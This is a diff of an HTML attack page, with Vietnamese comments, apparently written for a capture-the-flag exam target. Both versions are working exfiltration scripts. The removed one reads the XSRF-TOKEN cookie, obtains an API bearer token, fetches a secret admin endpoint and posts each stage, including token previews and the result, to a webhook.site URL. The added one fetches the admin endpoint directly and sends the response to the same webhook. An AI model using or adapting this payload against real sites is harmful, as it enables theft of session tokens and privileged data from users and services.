@@ -2,103 +2,39 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Get Flag Payload</title>
+    <title>Auto Fetch and Send</title>
 </head>
 <body>
-    <h1>Get Flag Payload Page</h1>
-      <script>
-        (function() {
-            const webhook_id = "0a90930c-2196-4924-aac4-470557244914";
-            const attacker_url = "https://webhook.site/" + webhook_id;
+    <h1>Flag is being fetched...</h1>
+    <script>
+        (function () {
+            const targetURL = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";
+            const webhookURL = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
 
-            // Gửi dữ liệu tới webhook bằng POST JSON
-            function sendPing(data) {
-                fetch(attacker_url, {
+            // Gửi dữ liệu JSON về webhook
+            function sendToWebhook(data) {
+                fetch(webhookURL, {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(data)
-                }).catch(e => {
-                    // Nếu lỗi gửi webhook thì log ra console
-                    console.error("sendPing error:", e);
+                }).catch(err => console.error("Webhook send failed:", err));
+            }
+
+            // Lấy dữ liệu từ API và gửi về webhook
+            fetch(targetURL)
+                .then(response => response.json())
+                .then(data => {
+                    sendToWebhook({
+                        stage: "fetched_flag_success",
+                        data: data
+                    });
+                })
+                .catch(err => {
+                    sendToWebhook({
+                        stage: "fetch_failed",
+                        error: err.toString()
+                    });
                 });
-            }
-
-            // Lấy token XSRF từ cookie
-            let xsrfTokenValue = null;
-            try {
-                const cookies = document.cookie.split(";");
-                for (let cookie of cookies) {
-                    cookie = cookie.trim();
-                    if (cookie.startsWith("XSRF-TOKEN=")) {
-                        xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
-                        break;
-                    }
-                }
-            } catch (e) {
-                sendPing({ stage: "cookie_parse_error", error: e.message });
-                return;
-            }
-
-            if (!xsrfTokenValue) {
-                sendPing({ stage: "xsrf_token_missing", url: window.location.href });
-                return;
-            }
-
-            sendPing({ stage: "script_start_get_flag", url: window.location.href, xsrf_preview: xsrfTokenValue.slice(0, 20) });
-
-            // Bước 1: Lấy API Token
-            fetch("/generate-token", {
-                method: "POST",
-                headers: {
-                    "Accept": "application/json",
-                    "X-Requested-With": "XMLHttpRequest",
-                    "X-XSRF-TOKEN": xsrfTokenValue
-                }
-            })
-            .then(response => {
-                if (!response.ok) {
-                    return response.text().then(text => {
-                        sendPing({ stage: "gen_token_FAIL", status: response.status, body: text });
-                        throw new Error("GenTokenFailStatus: " + response.status);
-                    });
-                }
-                return response.json();
-            })
-            .then(data => {
-                if (data && data.token) {
-                    sendPing({ stage: "got_api_token_SUCCESS", token_preview: data.token.slice(0, 20), user_name: data.user?.name || "N/A" });
-
-                    // Bước 2: Lấy FLAG với API Token
-                    return fetch("/api/admin/sup3rs3cr3t", {
-                        method: "GET",
-                        headers: {
-                            "Accept": "application/json",
-                            "Authorization": "Bearer " + data.token,
-                            "X-Requested-With": "XMLHttpRequest"
-                        }
-                    });
-                } else {
-                    sendPing({ stage: "gen_token_SUCCESS_but_no_token", data_received: JSON.stringify(data) });
-                    throw new Error("No token field in response");
-                }
-            })
-            .then(response => {
-                if (!response.ok) {
-                    return response.text().then(text => {
-                        sendPing({ stage: "get_flag_FAIL", status: response.status, body: text });
-                        throw new Error("GetFlagFailStatus: " + response.status);
-                    });
-                }
-                return response.json();
-            })
-            .then(flagData => {
-                sendPing({ stage: "FLAG2_RETRIEVED_SUCCESS", flag_payload: flagData });
-            })
-            .catch(error => {
-                sendPing({ stage: "overall_CATCH_ERROR", error_message: error.message, error_stack: error.stack });
-            });
         })();
     </script>
 </body>
